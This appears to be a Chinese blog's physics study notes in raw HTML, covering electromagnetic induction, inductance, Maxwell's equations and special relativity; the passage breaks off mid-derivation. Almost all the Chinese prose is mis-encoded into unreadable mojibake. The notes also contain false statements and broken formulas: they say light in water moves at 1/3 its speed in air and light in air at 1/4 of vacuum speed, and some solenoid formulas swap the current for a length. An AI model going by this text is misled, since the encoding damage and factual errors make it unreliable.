å‘ç°ï¼Œæ’å®šçš„ç£åœºä¸ä¼šäº§ç”Ÿç”µæµï¼Œåªæœ‰å˜åŒ–çš„ç£åœºæ‰èƒ½äº§ç”Ÿç”µæµ.</p><blockquote><p>æ€»ç»“ä¸º</p></blockquote><p>An induced emf is produced by a changing magnetic field</p><h2 id="27-2-æ³•æ‹‰ç¬¬æ„Ÿåº”å®šå¾‹å’Œæ¥æ¬¡å®šå¾‹Faradayâ€™s-Law-of-Induction-Lenzâ€™s-Law"><a href="#27-2-æ³•æ‹‰ç¬¬æ„Ÿåº”å®šå¾‹å’Œæ¥æ¬¡å®šå¾‹Faradayâ€™s-Law-of-Induction-Lenzâ€™s-Law" class="headerlink" title="27-2 æ³•æ‹‰ç¬¬æ„Ÿåº”å®šå¾‹å’Œæ¥æ¬¡å®šå¾‹Faradayâ€™s Law of Induction; Lenzâ€™s Law"></a>27-2 æ³•æ‹‰ç¬¬æ„Ÿåº”å®šå¾‹å’Œæ¥æ¬¡å®šå¾‹Faradayâ€™s Law of Induction; Lenzâ€™s Law</h2><p>ç£åœºå˜åŒ–è¶Šå¿«ï¼Œinduced emf è¶Šå¤§, ä¹Ÿå°±æ˜¯å’Œå˜åŒ–ç‡æœ‰å…³ (è¿™é‡Œæ˜¯ $\phi_B$ å³ flux çš„å˜åŒ–ç‡).</p><blockquote><p>æ±‚ $\phi_B$ flux çš„å…¬å¼<br>$$<br>\displaylines{\phi_B &#x3D; B_\perp A &#x3D; BA \cos \theta &#x3D; B \cdot A \newline~ \newline \phi_B &#x3D; \int B \cdot dA}<br>$$</p></blockquote><p><img src="/../img/magnetic_flux.png"></p><p>$\phi$ flux å¯ä»¥çœ‹ä½œæ˜¯ total number of lines passing through the loop. å•ä½å¯ä»¥ä»å…¬å¼ä¸­çœ‹å‡ºï¼Œä¸º tesla-meter$^2$, å³ weber, $1 Wb &#x3D; 1 T \cdot m^2$</p><blockquote><p>Faradayâ€™s Law of induction</p></blockquote><p>$$<br>\displaylines{\xi &#x3D; - \frac{d \phi_B}{dt} \newline~ \newline \xi &#x3D; -N \frac{d \phi_B}{dt}}<br>$$</p><p>ä¸ºä»€ä¹ˆæ˜¯è´Ÿæ•°ï¼Œè¿™å°±æ¶‰åŠåˆ° Lenzâ€™s Law.</p><blockquote><p>Lenzâ€™s Law</p></blockquote><p>An induced emf gives rise to a current whose magnetic field opposes the original change in flux.</p><p>ä¹Ÿå°±æ˜¯é˜»ç¢å˜åŒ–. å³å¦‚æœ flux å¢å¤§ï¼Œé‚£ä¹ˆæ„Ÿåº”çš„åˆ™ä¼šæ˜¯åæ–¹å‘ï¼Œå¦‚æœ flux å‡å°ï¼Œé‚£ä¹ˆæ„Ÿåº”çš„ä¼šæ˜¯åŒæ–¹å‘.</p><h2 id="27-3-ç§»åŠ¨å¯¼ä½“ä¸­çš„æ„Ÿåº”ç”µåŠ¨åŠ¿-EMF-Induced-in-a-Moving-Conductor"><a href="#27-3-ç§»åŠ¨å¯¼ä½“ä¸­çš„æ„Ÿåº”ç”µåŠ¨åŠ¿-EMF-Induced-in-a-Moving-Conductor" class="headerlink" title="27-3 ç§»åŠ¨å¯¼ä½“ä¸­çš„æ„Ÿåº”ç”µåŠ¨åŠ¿ EMF Induced in a Moving Conductor"></a>27-3 ç§»åŠ¨å¯¼ä½“ä¸­çš„æ„Ÿåº”ç”µåŠ¨åŠ¿ EMF Induced in a Moving Conductor</h2><blockquote><p>å¯¼ä½“æ£’ç§»åŠ¨, å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{\xi &#x3D; \frac{d \phi_B}{dt} &#x3D; \frac{B dA}{dt} &#x3D; \frac{Blv dt}{dt} &#x3D; Blv}<br>$$</p><p><img src="/../img/emf_induced_in_a_moving_conductor.png"></p><blockquote><p>å¯¼ä½“æ£’å—åŠ›å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{F &#x3D; IlB \newline~ \newline I &#x3D; \frac{\xi}{R} \newline~ \newline \xi &#x3D; Blv \newline~ \newline I &#x3D; \frac{Blv}{R} \newline~ \newline F &#x3D; IlB &#x3D; \frac{B^2 l^2}{R} v }<br>$$</p><h2 id="27-4-å˜åŒ–ç£é€šé‡äº§ç”Ÿç”µåœº-A-Changing-Magnetic-Flux-Produces-an-Electric-Field"><a href="#27-4-å˜åŒ–ç£é€šé‡äº§ç”Ÿç”µåœº-A-Changing-Magnetic-Flux-Produces-an-Electric-Field" class="headerlink" title="27-4 å˜åŒ–ç£é€šé‡äº§ç”Ÿç”µåœº A Changing Magnetic Flux Produces an Electric Field"></a>27-4 å˜åŒ–ç£é€šé‡äº§ç”Ÿç”µåœº A Changing Magnetic Flux Produces an Electric Field</h2><blockquote><p>Faradayâ€™s Law â€“ General Form</p></blockquote><p>$$<br>\displaylines{V_{ab} &#x3D; \int_a^b E \cdot dl \newline~ \newline \xi &#x3D; \oint E \cdot dl \newline~ \newline \oint E \cdot dl &#x3D; - \frac{d \phi_B}{dt}}<br>$$</p><p>å¦‚æœåŠ›æ˜¯ conservative force, å¦‚è¿™é‡Œçš„ç”µåœºåŠ›ï¼Œé‚£ä¹ˆ:<br>$$<br>\displaylines{ V_{ab} &#x3D; V_a - V_b &#x3D; \int_a^b E \cdot dl \newline~ \newline \oint E \cdot dl &#x3D; 0}<br>$$</p><p>å°½ç®¡é™ç”µåœºæ˜¯ conservative fields, ä½†æ˜¯å˜åŒ–ç£åœºäº§ç”Ÿçš„ç”µåœºæ˜¯ nonconservative field.</p><h1 id="Chapter-28-ç”µæ„Ÿå’Œç”µç£æ³¢-Inductance-and-Electromagnetic-Oscillations"><a href="#Chapter-28-ç”µæ„Ÿå’Œç”µç£æ³¢-Inductance-and-Electromagnetic-Oscillations" class="headerlink" title="Chapter 28 ç”µæ„Ÿå’Œç”µç£æ³¢ Inductance; and Electromagnetic Oscillations"></a>Chapter 28 ç”µæ„Ÿå’Œç”µç£æ³¢ Inductance; and Electromagnetic Oscillations</h1><h2 id="28-1-äº’æ„Ÿ-Mutual-Inductance"><a href="#28-1-äº’æ„Ÿ-Mutual-Inductance" class="headerlink" title="28-1 äº’æ„Ÿ Mutual Inductance"></a>28-1 äº’æ„Ÿ Mutual Inductance</h2><p>ä¸ç®¡æ˜¯äº’æ„Ÿç³»æ•°è¿˜æ˜¯è‡ªæ„Ÿç³»æ•°ï¼Œéƒ½åªå’Œå¯¼ä½“æœ¬èº«æœ‰å…³ï¼Œå¦‚å½¢çŠ¶ï¼Œé¢ç§¯. ä¸å¼•èµ·æ„Ÿåº”ç°è±¡çš„ç”µæµæ— å…³.</p><p>Inductance è¿™ä¸ªé‡ç”¨æ¥æè¿°ï¼Œç”µæµçš„å˜åŒ–ä¼šå¼•èµ·çš„ $\phi_B$ flux çš„å˜åŒ–æ˜¯å¤šå°‘.</p><blockquote><p>äº’æ„Ÿç¤ºæ„å›¾</p></blockquote><p><img src="/../img/mutual_inductance_diagram.png"></p><p>Mutual inductance, ä»åå­—å°±èƒ½çœ‹å‡ºï¼Œè‡³å°‘éœ€è¦ä¸¤ä¸ªå¯¼ä½“.</p><blockquote><p>Inductance è®¡ç®—å…¬å¼</p></blockquote><p>$$<br>\displaylines{M_{21} &#x3D; \frac{N_2 \phi_{21}}{I_1}}<br>$$</p><blockquote><p>è¡¨æ˜ Inductance å’Œç”µæµ I æ— å…³çš„å…¬å¼æ¨å¯¼</p></blockquote><p>å€ŸåŠ©è¿™é“é¢˜ç›®:</p><p><img src="/../img/no_relation_to_current_Inductance.png"><br>$$<br>\displaylines{B &#x3D; \mu_0 \frac{N_1}{l} l_1 \newline~ \newline \phi_{21} &#x3D; BA &#x3D; \mu_0 \frac{N_1}{l} I_1 A \newline~ \newline M &#x3D; \frac{N_2 \phi_{21}}{I_1} &#x3D; \frac{\mu_0 N_1 N_2 A}{l}}<br>$$</p><blockquote><p>ç”¨ Inductance è®¡ç®— emf çš„å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{M_21 &#x3D; \frac{N_2 \phi_{21}}{I_1} \newline~ \newline \xi_2 &#x3D; - N_2 \frac{d \phi_{21}}{dt} \newline~ \newline \xi_2 &#x3D; - M_{21} \frac{dI_1}{dt}}<br>$$</p><p>Mutual inductance çš„å•ä½æ˜¯ henry (H), ä»å…¬å¼å¯ä»¥çœ‹å‡ºï¼Œä¸º $1 H &#x3D; 1 V \cdot s&#x2F;A &#x3D; 1 \Omege \cdot s$</p><p>Mutual inductance å¯ç”¨æ¥ä¼ é€’èƒ½é‡.</p><h2 id="28-2-è‡ªæ„Ÿ-Self-Inductance"><a href="#28-2-è‡ªæ„Ÿ-Self-Inductance" class="headerlink" title="28-2 è‡ªæ„Ÿ Self-Inductance"></a>28-2 è‡ªæ„Ÿ Self-Inductance</h2><p>å’Œ mutual inductance æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ª solenoid (å¯èƒ½ä¹Ÿä¸æ˜¯ solenoid), å®ƒè‡ªèº«çš„å˜åŒ–å¼•èµ·è‡ªèº«çº¿åœˆäº§ç”Ÿæ„Ÿåº”ç”µæµ.</p><blockquote><p>Self-Inductance è®¡ç®—å…¬å¼</p></blockquote><p>$$<br>\displaylines{L &#x3D; \frac{N \phi_B}{I}}<br>$$</p><blockquote><p>åŒæ ·å¯ä»¥æ¨å¯¼å‡ºå…¶å¤§å°ä¸ç”µæµæ— å…³, è¿™é‡Œä»¥ä¸€ä¸ª solenoid ä¸ºä¾‹</p></blockquote><p>$$<br>\displaylines{B &#x3D; \mu_0 nl \newline~ \newline n &#x3D; \frac{N}{l} \newline~ \newline \phi_B &#x3D; BA &#x3D; \frac{\mu_0 NIA}{l} \newline~ \newline L &#x3D; \frac{N \phi_B}{I} &#x3D; \frac{\mu_0 N^2 A}{l}}<br>$$</p><blockquote><p>åˆ©ç”¨è‡ªæ„Ÿå’Œ Faradayâ€™s law è®¡ç®— emf</p></blockquote><p>$$<br>\displaylines{ L &#x3D; N \frac{\phi_B}{I} \newline~ \newline \xi &#x3D; -N \frac{d \phi_B}{dt} &#x3D; - L \frac{dI}{dt}}<br>$$</p><p>ä»å…¬å¼å¯ä»¥çœ‹å‡º, $L$ è¶Šå¤§ï¼Œåå‘çš„ emf å°±è¶Šå¤§, $I &#x3D; \frac{V}{R}$, å°±ä¼šå˜å°ï¼Œå› æ­¤inductance å¯ä»¥å……å½“ç”µé˜»ä½¿ç”¨.</p><h2 id="28-3-å­˜å‚¨åœ¨ç£åœºä¸­çš„èƒ½é‡-Energy-Stored-in-a-Magnetic-Field"><a href="#28-3-å­˜å‚¨åœ¨ç£åœºä¸­çš„èƒ½é‡-Energy-Stored-in-a-Magnetic-Field" class="headerlink" title="28-3 å­˜å‚¨åœ¨ç£åœºä¸­çš„èƒ½é‡ Energy Stored in a Magnetic Field"></a>28-3 å­˜å‚¨åœ¨ç£åœºä¸­çš„èƒ½é‡ Energy Stored in a Magnetic Field</h2><p>è®©æ„Ÿåº”ç”µæµè¾¾åˆ° I æ‰€æ¶ˆè€—çš„èƒ½é‡å°±æ˜¯ inductance æ‰€å­˜å‚¨çš„èƒ½é‡.</p><blockquote><p>å…¬å¼æ¨å¯¼ï¼Œå½“ inductance L ä¸­ç”µæµçš„å˜åŒ–é€Ÿç‡ä¸º $ \frac{dI}{dt}$ æ—¶</p></blockquote><p>$$<br>\displaylines{P &#x3D; I \xi &#x3D; L I \frac{dI}{dt} \newline~ \newline dW &#x3D; P dt &#x3D; L I di \newline~ \newline W &#x3D; \int dW &#x3D; \int_0^I L I dI &#x3D; \frac{1}{2} L I^2 \newline~ \newline U &#x3D; \frac{1}{2} L I^2}<br>$$</p><p>å†™æˆç£åœºçš„å½¢å¼ï¼Œè¿™å’Œè½½ä½“æœ‰å…³ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ª solenoid:<br>$$<br>\displaylines{L &#x3D; \frac{\mu_0 N^2 A}{l} \newline~ \newline U &#x3D; \frac{1}{2} L I^2 &#x3D; \frac{1}{2} ( \frac{\mu_0 N^2 A}{l}) (\frac{Bl}{\mu_0 N})^2 &#x3D; \frac{1}{2} \frac{B^2}{\mu_0}Al \newline~ \newline \mu &#x3D; \frac{1}{2} \frac{B^2}{\mu_0}}<br>$$</p><p>$\mu$ æ˜¯èƒ½é‡å¯†åº¦ ($Al$ å°±æ˜¯ä½“ç§¯).</p><p>ä¸å­˜å‚¨åœ¨ç”µåœºä¸­çš„èƒ½é‡ç»“åˆè®°å¿†:</p><blockquote><p>ç”µåœºä¸­</p></blockquote><p>$$<br>\displaylines{\mu &#x3D; \frac{1}{2} \epsilon_0 E^2}<br>$$</p><blockquote><p>ç£åœºä¸­</p></blockquote><p>$$<br>\displaylines{\mu &#x3D; \frac{1}{2} \frac{B^2}{\mu_0}}<br>$$</p><h1 id="Chapter-29-éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ç»„å’Œç”µç£æ³¢-Maxwellâ€™s-Equations-and-Electromagnetic-Waves"><a href="#Chapter-29-éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ç»„å’Œç”µç£æ³¢-Maxwellâ€™s-Equations-and-Electromagnetic-Waves" class="headerlink" title="Chapter 29 éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ç»„å’Œç”µç£æ³¢ Maxwellâ€™s Equations and Electromagnetic Waves"></a>Chapter 29 éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ç»„å’Œç”µç£æ³¢ Maxwellâ€™s Equations and Electromagnetic Waves</h1><p>ç”µç£åœºæ³¢å¯ä»¥ç©¿è¿‡ç©ºé—´.</p><p>éº¦å…‹æ–¯éŸ¦å°†æ‰€æœ‰çš„ç”µå’Œç£ç°è±¡ç»Ÿä¸€åˆ°ä¸€ä¸ªç†è®ºä¸­.</p><p>åœºçš„æ¦‚å¿µç”±æ³•æ‹‰ç¬¬å¼•å‡º.</p><p>æ‰€æœ‰çš„ç”µå’Œç£ç°è±¡éƒ½å¯ä»¥ç”¨å››ä¸ªåŒ…å«ç”µåœºå’Œç£åœºçš„æ–¹ç¨‹æè¿°, è¿™äº›æ–¹ç¨‹è¢«ç§°ä¸º <mark>éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ç»„ (Maxwellâ€™s equations)</mark>.</p><h2 id="å˜åŒ–çš„ç”µåœºäº§ç”Ÿç£åœº-å®‰åŸ¹å®šç†å’Œä½ç§»ç”µæµ-Changing-Electric-Fields-Produce-Magnetic-Fields-Ampereâ€™s-Law-and-Displacement-Current"><a href="#å˜åŒ–çš„ç”µåœºäº§ç”Ÿç£åœº-å®‰åŸ¹å®šç†å’Œä½ç§»ç”µæµ-Changing-Electric-Fields-Produce-Magnetic-Fields-Ampereâ€™s-Law-and-Displacement-Current" class="headerlink" title="å˜åŒ–çš„ç”µåœºäº§ç”Ÿç£åœº; å®‰åŸ¹å®šç†å’Œä½ç§»ç”µæµ Changing Electric Fields Produce Magnetic Fields; Ampereâ€™s Law and Displacement Current"></a>å˜åŒ–çš„ç”µåœºäº§ç”Ÿç£åœº; å®‰åŸ¹å®šç†å’Œä½ç§»ç”µæµ Changing Electric Fields Produce Magnetic Fields; Ampereâ€™s Law and Displacement Current</h2><blockquote><p>å®‰åŸ¹å®šç†, ç”µæµäº§ç”Ÿç£åœº</p></blockquote><p>$$<br>\displaylines{\oint B \cdot dl &#x3D; \mu_0 I_{encl}}<br>$$</p><h1 id="Chapter-32-ç›¸å¯¹è®º-Special-Theory-of-Relativity"><a href="#Chapter-32-ç›¸å¯¹è®º-Special-Theory-of-Relativity" class="headerlink" title="Chapter 32 ç›¸å¯¹è®º Special Theory of Relativity"></a>Chapter 32 ç›¸å¯¹è®º Special Theory of Relativity</h1><p>è®¨è®ºå‡ ä¸ªéç»å…¸çš„ç»“è®º, è¿åŠ¨å‚è€ƒç³»çš„ <mark>é•¿åº¦æ”¶ç¼© (length contraction)</mark> å’Œ <mark>æ—¶é—´è†¨èƒ€ (time dilation)</mark> </p><p>ä¸»è¦è®°ä½  </p><ul><li>ä¸åŒå‚è€ƒç³»çš„åŒæ—¶æ€§ä¸åŒ, å³ä¸€ä¸ªæ—¶é—´åœ¨ä¸€ä¸ªå‚è€ƒç³»å‘ç”Ÿ, åœ¨å¦ä¸€ä¸ªå‚è€ƒç³»ä¸‹å¯èƒ½æ²¡æœ‰å‘ç”Ÿ</li><li><mark>é€Ÿåº¦è¶Šå¤§, é•¿åº¦è¶ŠçŸ­</mark></li><li><mark>é€Ÿåº¦è¶Šå¤§, æ—¶é—´è¶Šæ…¢</mark></li></ul><p>20 ä¸–çºªä¹‹å‰çš„ç‰©ç†å­¦ç§°ä¸º <mark>ç»å…¸ç‰©ç† (classical physics)</mark> </p><p>20 ä¸–çºªä¹‹åçš„ç‰©ç†å­¦ç§°ä¸º <mark>ç°ä»£ç‰©ç† (modern physics)</mark> , ä¸»è¦æ˜¯ç›¸å¯¹è®ºå’Œé‡å­åŠ›å­¦çš„å‘å±•.</p><p>ç‹­ä¹‰ç›¸å¯¹è®ºå’Œå¹¿ä¹‰ç›¸å¯¹è®ºåˆ†åˆ«æŒ‡ä»£çš„ä¸œè¥¿:</p><ul><li>ç‹­ä¹‰ç›¸å¯¹è®ºæ˜¯æŒ‡é˜¿å°”ä¼¯ç‰¹Â·çˆ±å› æ–¯å¦åœ¨1905å¹´æ<br>å‡ºçš„ç›¸å¯¹è®ºï¼Œå®ƒæè¿°çš„æ˜¯ç‰©ç†å®šå¾‹åœ¨ä¸åŒçš„å‚ç…§ç³»ä¸­çš„å˜åŒ–ã€‚</li><li>å¹¿ä¹‰ç›¸å¯¹è®ºåˆ™æ˜¯1915å¹´çˆ±å› æ–¯å¦æå‡ºçš„ï¼Œå®ƒæŠŠæ—¶ç©ºå’Œç‰©è´¨ç»“åˆåœ¨ä¸€èµ·ï¼Œè®¤ä¸ºæ—¶ç©ºæ˜¯å¯ä»¥æ‰­æ›²çš„ï¼Œè€Œç‰©è´¨åˆ™å—åˆ°æ—¶ç©ºçš„å½±å“</li></ul><h2 id="32-1-ä¼½åˆ©ç•¥-ç‰›é¡¿-ç›¸å¯¹è®º"><a href="#32-1-ä¼½åˆ©ç•¥-ç‰›é¡¿-ç›¸å¯¹è®º" class="headerlink" title="32.1 ä¼½åˆ©ç•¥-ç‰›é¡¿ ç›¸å¯¹è®º"></a>32.1 ä¼½åˆ©ç•¥-ç‰›é¡¿ ç›¸å¯¹è®º</h2><p>çˆ±å› æ–¯å¦ç›¸å¯¹è®ºæ”¹å˜çš„æ˜¯<mark>è§‚å¯Ÿä¸åŒå‚è€ƒç³»çš„æ–¹å¼</mark>.</p><p>åœ¨ä¸€ä¸ªå‚è€ƒç³»ä¸­çš„é•¿åº¦, åœ¨å¦ä¸€ä¸ªå‚è€ƒç³»ä¸­å¯èƒ½ä¸åŒ.</p><p>åœ¨ä¸€ä¸ªå‚è€ƒç³»ä¸­çš„æ—¶é—´, åœ¨å¦ä¸€ä¸ªå‚è€ƒç³»ä¸­å¯èƒ½ä¸åŒ.</p><p>ç‹­ä¹‰ç›¸å¯¹è®ºå¤„ç†çš„æ˜¯<mark>æƒ¯æ€§ç³» (inertial reference frames)</mark>çš„äº‹ä»¶.</p><p>(æƒ¯æ€§ç³»æŒ‡æ»¡è¶³ç‰›é¡¿ç¬¬ä¸€å®šå¾‹çš„å‚è€ƒç³», å³ä¸å—å¤–åŠ›çš„ç‰©ä½“ä¼šä¿æŒé™æ­¢æˆ–åŒ€é€Ÿç›´çº¿è¿åŠ¨)</p><p>æ—‹è½¬å’Œå…¶ä»–åŠ é€Ÿå‚è€ƒç³»æ˜¯éæƒ¯æ€§ç³».</p><p>ç›¸å¯¹äºä¸€ä¸ªæƒ¯æ€§å‚è€ƒç³»åŒ€é€Ÿè¿åŠ¨çš„å‚è€ƒç³»æœ¬èº«, ä¹Ÿæ˜¯ä¸€ä¸ªæƒ¯æ€§å‚è€ƒç³».</p><p><mark>ä¼½åˆ©ç•¥å’Œç‰›é¡¿è®¤ä¸ºçš„ç›¸å¯¹è®º</mark>: åŸºæœ¬çš„ç‰©ç†æ³•åˆ™åœ¨æ‰€æœ‰çš„æƒ¯æ€§å‚è€ƒç³»ä¸­ç›¸åŒ. </p><p>ä¼½åˆ©ç•¥å’Œç‰›é¡¿çš„ç›¸å¯¹è®ºåŒ…æ‹¬å‡ ä¸ªæ— æ³•è¯æ˜çš„å‡è®¾. å…¶å‡è®¾</p><ul><li>ç‰©ä½“åœ¨ä¸€ä¸ªå‚è€ƒç³»ä¸­çš„é•¿åº¦å’Œåœ¨å¦ä¸€ä¸ªå‚è€ƒç³»ä¸­ç›¸åŒ.</li><li>ç‰©ä½“åœ¨ä¸€ä¸ªå‚è€ƒç³»ä¸­æ—¶é—´æµé€çš„é€Ÿåº¦å’Œå¦ä¸€ä¸ªå‚è€ƒç³»ç›¸åŒ</li></ul><p>åœ¨ç»å…¸åŠ›å­¦ä¸­, æ—¶é—´å’Œç©ºé—´æ˜¯ç»å¯¹çš„, å³, å…¶æµ‹é‡å€¼ä¸ä¼šéšå‚è€ƒç³»æ”¹å˜è€Œæ”¹å˜. ç‰©ä½“çš„è´¨é‡, æ‰€å—çš„ä½œç”¨åŠ›, åŠ é€Ÿåº¦éƒ½ä¸å—å‚è€ƒç³»å½±å“. å› æ­¤, ç‰›é¡¿ç¬¬äºŒå®šå¾‹ $F&#x3D;ma$ ä¹Ÿæ»¡è¶³å…¶ç›¸å¯¹è®º. è¡¨æ˜ <mark>æ‰€æœ‰çš„æƒ¯æ€§ç³»éƒ½æ˜¯ç›¸åŒçš„</mark> </p><p><mark>ç‰›é¡¿-ä¼½åˆ©ç•¥ç›¸å¯¹è®ºå‡ºç°é—®é¢˜</mark> , äºéº¦å…‹æ–¯éŸ¦é¢„æµ‹å‡ºäº†å…‰é€Ÿä¸º $3.00 \times 10^8m&#x2F;s$, å…¶æ–¹ç¨‹å¹¶æ²¡æœ‰æ˜¾ç¤ºå…‰æœ‰ç›¸å¯¹é€Ÿåº¦. å› æ­¤ç§‘å­¦å®¶è®¤ä¸ºè¿™é‡Œæœ‰ä¸€ä¸ªç‰¹æ®Šçš„å‚è€ƒç³», ä½¿å¾—å…‰é€Ÿä¸º $3.0 \times 10^8m&#x2F;s$</p><p>å½“æ—¶çš„ç§‘å­¦å®¶è®¤ä¸ºå…‰ä¼ æ’­åœ¨ä¸€ä¸ªç‰¹æ®Šçš„ä»‹è´¨ <mark>ether (ä»¥å¤ª)</mark> ä¸­, å¹¶ä¸”å‡è®¾ä»¥å¤ªæ¸—é€äºæ‰€æœ‰ç©ºé—´. è®¤ä¸ºéº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ä¸­çš„å…‰é€Ÿå’Œä»¥å¤ªç›¸å…³.</p><p>äº‹å®è¯æ˜éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹å¹¶ä¸æ»¡è¶³ç›¸å¯¹æ€§åŸç†.</p><p>å¾ˆå¤šå®éªŒéƒ½è¡¨æ˜å…‰çš„é€Ÿåº¦ä¸å˜.</p><h2 id="32-2-è¿ˆå…‹è€³é€Š-è«é›·å®éªŒ-The-Michelson-Morley-Experiment"><a href="#32-2-è¿ˆå…‹è€³é€Š-è«é›·å®éªŒ-The-Michelson-Morley-Experiment" class="headerlink" title="32.2 è¿ˆå…‹è€³é€Š-è«é›·å®éªŒ The Michelson-Morley Experiment"></a>32.2 è¿ˆå…‹è€³é€Š-è«é›·å®éªŒ The Michelson-Morley Experiment</h2><h2 id="32-3-ç‹­ä¹‰ç›¸å¯¹è®ºçš„å‡è®¾-Postulates-of-the-Special-Theory-of-Relativity"><a href="#32-3-ç‹­ä¹‰ç›¸å¯¹è®ºçš„å‡è®¾-Postulates-of-the-Special-Theory-of-Relativity" class="headerlink" title="32.3 ç‹­ä¹‰ç›¸å¯¹è®ºçš„å‡è®¾ Postulates of the Special Theory of Relativity"></a>32.3 ç‹­ä¹‰ç›¸å¯¹è®ºçš„å‡è®¾ Postulates of the Special Theory of Relativity</h2><p>çˆ±å› æ–¯å¦çš„ä¸¤ä¸ªå‡è®¾:</p><ol><li>åœ¨æ‰€æœ‰å‚è€ƒç³»ä¸­, ç‰©ç†å®šç†éƒ½æœ‰ç›¸åŒçš„å½¢å¼ (è€Œä¸æ˜¯ç›¸åŒ)</li><li>å…‰åœ¨æ— ä»‹è´¨çš„ç©ºé—´ä¼ æ’­, å…‰é€Ÿä¸ç®¡æ˜¯ç›¸å¯¹äºè§‚å¯Ÿè€…è¿˜æ˜¯å‘å°„æº, é€Ÿåº¦éƒ½ä¸º c (è¿™é‡Œä¹Ÿå°±æ”¾å¼ƒäº† ether çš„å‡è¯´, å®é™…ä¸Š ether ä¹Ÿä»æœªè¢«å‘ç°)</li></ol><p>è¿™ä¸¤ä¸ªå‡è®¾æ˜¯çˆ±å› æ–¯å¦ç›¸å¯¹è®ºçš„åŸºç¡€.</p><p>åŠ ä¸Š special (ç‹­ä¹‰) æ˜¯ä¸ºäº†å’Œçˆ±å› æ–¯å¦ä¹‹åå‘å¸ƒçš„ general theory of relativity ç›¸åŒºåˆ†.</p><p>Michelson-Morley å®éªŒä¹Ÿå’Œå…‰é€Ÿä¸å˜ç›¸å»åˆ. (å…‰é€Ÿä¸å˜æŒ‡çš„æ˜¯å…‰åœ¨çœŸç©ºä¸­ä¼ æ’­æ—¶, åœ¨ä»»ä½•å‚è€ƒç³»ä¸­çš„é€Ÿåº¦ä¸å˜, è€Œä¸æ˜¯å…‰åœ¨ä»»ä½•ä»‹è´¨ä¸­éƒ½ä¸å˜, å®é™…ä¸Š, æ°´ä¸­çš„å…‰é€Ÿæ˜¯ç©ºæ°”ä¸­çš„å…‰é€Ÿçš„ 1&#x2F;3, ç©ºæ°”ä¸­çš„å…‰é€Ÿæ˜¯çœŸç©ºä¸­çš„å…‰é€Ÿçš„ 1&#x2F;4)</p><h2 id="32-4-åŒæ—¶æ€§-Simultaneity"><a href="#32-4-åŒæ—¶æ€§-Simultaneity" class="headerlink" title="32.4 åŒæ—¶æ€§ Simultaneity"></a>32.4 åŒæ—¶æ€§ Simultaneity</h2><p>ç‹­ä¹‰ç›¸å¯¹è®ºä¸­çš„åŒæ—¶æ€§æŒ‡, äº‹ä»¶å‘ç”Ÿçš„ä½ç½®å’Œæ—¶é—´æ˜¯ç›¸å¯¹çš„ï¼Œå³ä¸¤ä¸ªäº‹ä»¶åœ¨ä¸€ä¸ªå‚ç…§ç³»ä¸­å¯ä»¥åŒæ—¶å‘ç”Ÿï¼Œä½†åœ¨å¦ä¸€ä¸ªå‚ç…§ç³»ä¸­å¯èƒ½ä¸åŒæ—¶å‘ç”Ÿã€‚</p><p>è§ <a href="https://orkarin.com/2022/12/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA%E5%92%8C%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/">å¦ä¸€ç¯‡æ–‡ç« </a>.</p><p>è¿™é‡Œåˆ©ç”¨ä¸€ä¸ªæ€æƒ³å®éªŒæ¥éªŒè¯åŒæ—¶æ€§æ˜¯å¦å­˜åœ¨.</p><h2 id="32-5-æ—¶é—´è†¨èƒ€å’ŒåŒç”Ÿå­æ‚–è®º-Time-Dilation-and-the-Twin-Paradox"><a href="#32-5-æ—¶é—´è†¨èƒ€å’ŒåŒç”Ÿå­æ‚–è®º-Time-Dilation-and-the-Twin-Paradox" class="headerlink" title="32.5 æ—¶é—´è†¨èƒ€å’ŒåŒç”Ÿå­æ‚–è®º Time Dilation and the Twin Paradox"></a>32.5 æ—¶é—´è†¨èƒ€å’ŒåŒç”Ÿå­æ‚–è®º Time Dilation and the Twin Paradox</h2><p><mark>é€Ÿåº¦è¶Šå¤§, æ—¶é—´è¶Šæ…¢</mark> </p><p>ä¾‹å­å¦‚:</p><p><img src="/../img/time_dilation_example.png"></p><p>å›¾ $(a)$ ä¸ºé£èˆ¹, ä»¥é€Ÿåº¦ $v$ å‘å³è¿åŠ¨, å›¾ $(b)$ æœ‰äººç«™åœ¨åœ°çƒä¸Šè§‚å¯Ÿ.</p><p>é£èˆ¹ä¸Šçš„äººç”¨å…‰æºå‘å¯¹é¢çš„é•œå­å‘å°„å…‰æŸ, é•œå­ä¸å…‰æºä¹‹é—´çš„è·ç¦»ä¸º $D$, å› æ­¤æ‰€ç”¨çš„æ—¶é—´ä¸º:</p><p>$$<br>\displaylines{\Delta t_0 &#x3D; \frac{2D}{c}}<br>$$</p><p>å¯¹äºåœ°çƒä¸Šçš„äºº, å…‰æŸçš„é£è¡Œè·ç¦»ä¸º:</p><p>$$<br>\displaylines{ 2 \sqrt{D^2 + L^2} \newline~ \newline<br>2L &#x3D; v \Delta t \newline~ \newline<br>è·ç¦»æœ€ç»ˆä¸º: \newline~ \newline<br>\frac{2 \sqrt{D^2 + \frac{v^2(\Delta t)a^2}{4}}{\Delta t}}<br>$$</p><p>æ‰€èŠ±çš„æ—¶é—´ä¸º:</p><p>$$<br>\displaylines{\Delta t &#x3D; \frac{\frac{2 \sqrt{D^2 + \frac{v^2(\Delta t)a^2}{4}}{\Delta t}}{c} \newline~ \newline<br>&#x3D; \frac{2D}{c \sqrt{1- \frac{v^2}{c^2}} \newline~ \newline<br>å¸¦å…¥ \Delta t_0 &#x3D; \frac{2D}{c} å¾—: \newline~ \newline<br>\Delta t &#x3D; \frac{\Delta t_0}{\sqrt{1 - \frac{v^2}{c^2}}}<br>$$<br>(è¿™é‡Œ $\Delta t_0$ å¯ä»¥çœ‹ä½œé€Ÿåº¦å¿«çš„ç‰©ä½“çš„æ—¶é—´)</p><p>è¿™é‡Œ $\sqrt{1- \frac{v^2}{c^2}} &lt; 